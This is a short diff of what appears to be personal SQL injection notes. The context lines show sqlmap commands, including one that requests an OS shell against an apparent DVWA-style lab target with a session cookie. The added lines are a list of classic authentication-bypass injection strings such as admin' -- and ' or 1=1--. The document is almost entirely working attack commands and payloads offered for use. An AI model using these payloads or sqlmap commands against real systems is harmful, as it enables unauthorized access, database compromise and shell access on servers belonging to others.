@@ -27,3 +27,14 @@ sqlmap --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u "http://
 (--force-ssl)
 
 sqlmap -r secnhack --os-shell
+
+
+
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—
